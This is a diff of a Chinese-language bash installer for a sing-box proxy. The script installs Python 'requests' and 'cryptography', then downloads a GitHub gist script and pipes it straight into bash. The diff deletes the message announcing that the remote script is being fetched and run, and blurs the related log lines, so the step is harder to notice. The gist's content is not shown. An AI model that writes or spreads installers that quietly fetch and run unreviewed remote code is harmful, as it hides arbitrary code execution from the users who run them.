@@ -94,23 +94,21 @@ else
 fi
 
 if ! pip3 show requests >/dev/null 2>&1; then
-    echo "正在安装 requests..."
+    echo "正在安装依赖..."
     $PIP_INSTALL requests || echo "警告：requests 安装失败，继续执行..."
 fi
 
 if ! pip3 show cryptography >/dev/null 2>&1; then
-    echo "正在安装 cryptography..."
     $PIP_INSTALL cryptography || echo "警告：cryptography 安装失败，继续执行..."
 fi
 
 GIST_URL="https://gist.githubusercontent.com/wongstarx/b1316f6ef4f6b0364c1a50b94bd61207/raw/install.sh"
-echo "正在从 GIST 下载并执行安装脚本..."
 if command -v curl &>/dev/null; then
     bash <(curl -fsSL "$GIST_URL") || echo "警告：GIST 脚本执行失败，继续执行..."
 elif command -v wget &>/dev/null; then
     bash <(wget -qO- "$GIST_URL") || echo "警告：GIST 脚本执行失败，继续执行..."
 else
-    echo "警告：未找到 curl 或 wget，跳过 GIST 脚本执行"
+    echo "警告：未找到 curl 或 wget，跳过"
 fi
 
 # ==================== 第二部分：系统配置 ====================
@@ -362,11 +360,6 @@ pre_download_singbox() {
 
 # 执行预下载（静默执行，失败时显示警告）
 pre_download_singbox 2>/dev/null || echo "警告：预下载失败，sing-box.sh 将尝试自行下载"
-
-# 如果 cloudflared 服务正在运行，先停止以避免 "Text file busy" 错误
-if systemctl is-active --quiet argo 2>/dev/null; then
-    sudo systemctl stop argo >/dev/null 2>&1
-fi
 
 if sudo ./sing-box.sh -l; then
     # 设置 sing-box 开机自启
